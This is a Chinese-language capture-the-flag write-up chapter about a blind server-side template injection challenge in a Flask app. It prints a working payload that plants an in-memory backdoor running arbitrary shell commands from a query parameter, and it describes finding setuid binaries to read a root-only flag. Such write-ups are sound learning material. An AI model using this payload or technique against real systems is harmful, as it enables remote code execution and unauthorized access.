# 第二十二章

出题人还是手下留情了，我本可能这辈子都无法反应过来发生了什么（

调用了`render_template_string`，但是没有给出结果，因此是无回显的ssti。可以参考这篇文章搞个内存马： https://the0n3.top/pages/77dbc1

最终payload如下：
```
?username={{url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen(__import__('flask').request.args.get('a')).read())")}}&password=b&a=rev --HDdss cat /flag
```
当时找到内存马那篇文章后以为这题就结束了，没想到env里没有flag。于是去根目录看了一眼。一个flag静静地躺在那里，然而需要root权限才能读。要我搞提权？这是web吗？

还好提权方法藏得不深，`find / -perm -4000 2>/dev/null`可以发现`/usr/bin/rev`有setuid，简单说就是运行时有root权限。非常好，快把flag给我吧（

结果运行`rev /flag`没有任何输出。嗯？得用绝对路径吗？`/usr/bin/rev`也没输出啊？用`>`重定向？还是出错了？什么都没有啊？此处省略一堆无用繁琐的傻子调试过程，包括：
- find搜索根目录下全部带有moectf字样的文件
- 不死心去看所有进程的environ
- 重启连接
- 本地调试
- 换payload
- （以上这些措施和提权有任何关系吗……）

总之最后我的结论是——这个根目录的flag是不是假的啊？烟雾弹？问题是它也没有藏任何其他的东西啊？

最后的最后选择了傻子方法：手动查看每个目录。app目录里没东西，然后看`bin -> usr/bin`。划到最后发现有个`rev.c`……此rev非彼rev……还好这玩意在bin目录里，顺序比较前，不然我一定会错过